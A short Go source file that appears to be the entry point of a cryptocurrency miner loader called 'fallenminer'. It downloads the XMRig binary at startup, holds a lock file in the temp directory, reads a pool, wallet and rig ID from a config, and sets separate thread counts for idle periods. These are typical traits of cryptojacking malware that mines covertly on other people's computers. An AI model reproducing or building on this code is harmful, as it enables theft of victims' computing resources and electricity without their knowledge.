package main

import (
	_ "embed"
	"fmt"
	"os"
	"time"
)

var xmrig = downloadxmrig("http://localhost/xmrig")

func main() {
	defer cleanup()

	if !acquireLock(os.TempDir() + "\\fallenminer.lock") {
		fmt.Println("Another instance of this program is already running.")
		os.Exit(0)
		return
	}

	go getConfig()
	time.Sleep(10 * time.Second)
	fmt.Println("------ CONFIG ------")
	fmt.Println("Mining Pool : " + miningpool)
	fmt.Println("Mining Wallet : " + mining_wallet)
	fmt.Println("Mining Password/RIGID: " + mining_password)
	fmt.Printf("Active Threads: %d\n", threads)
	fmt.Printf("Idle Time: %d\n", idle_time)
	fmt.Printf("Idle Threads: %d\n ", idlethreads)
	runChecks()

}
